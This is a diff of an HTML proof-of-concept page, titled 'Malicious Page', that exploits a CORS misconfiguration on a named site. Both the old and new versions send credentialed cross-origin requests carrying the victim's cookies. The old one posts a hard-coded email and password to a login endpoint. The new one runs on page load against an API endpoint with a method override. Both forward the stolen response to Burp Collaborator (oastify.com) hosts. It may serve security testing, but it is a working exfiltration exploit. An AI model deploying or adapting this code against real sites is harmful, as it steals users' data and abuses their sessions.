@@ -1,35 +1,27 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Malicious Page</title>
+</head>
 <body>
-    <center>
-        <h2>CORS Exploit</h2>
-        <p>Click the button to exploit the CORS vulnerability:</p>
-        <button onclick="exploit()">Exploit</button>
-    </center>
+    <h1>Exploiting CORS Misconfiguration</h1>
     <script>
-        function exploit() {
-            var xhttp = new XMLHttpRequest();
-            xhttp.onreadystatechange = function () {
-                if (this.readyState == 4 && this.status == 200) {
-                    // Send the response to Burp Collaborator
-                    fetch("https://wttmiw0qtgd86dxm2tpb9vlew52wqreg.oastify.com", {
-                        method: "POST",
-                        body: btoa(this.responseText), // Encode the data
-                        headers: {
-                            "Content-Type": "text/plain"
-                        }
-                    }).catch(err => console.error("Error sending to Collaborator:", err));
-                }
-            };
+        // Exploit code
+        var req = new XMLHttpRequest();
+        req.onload = function () {
+            // Display victim's data in an alert box (or send it to attacker's server)
+            alert("Victim's Data: " + this.responseText);
 
-            // Adjust the URL to the endpoint and provide necessary data
-            xhttp.open("POST", "https://quitplan.ycq2.org/login", true);
-            xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            xhttp.withCredentials = true; // Include victim's cookies
-            
-            // Adjust payload as needed
-            var payload = "email=annamarykwayu6@gmail.com&password=Testing2";
-            xhttp.send(payload);
-        }
+            // Optionally, exfiltrate data to the attacker's server
+            fetch('https://p8yfxpfj89s1l6cfhm44oo07byhp5mtb.oastify.com', {
+                method: 'POST',
+                body: this.responseText,
+                headers: { 'Content-Type': 'application/json' }
+            });
+        };
+        req.open('GET', 'https://quitplan.ycq2.org/api/slips/?_method=PUT&time=Mon+Dec+23+2024+23%3a48%3a18+GMT-0800+%28Pacific+Standard+Time%29&note=&tz=-08%3a00&newTrigger=', true);
+        req.withCredentials = true;
+        req.send();
     </script>
 </body>
 </html>
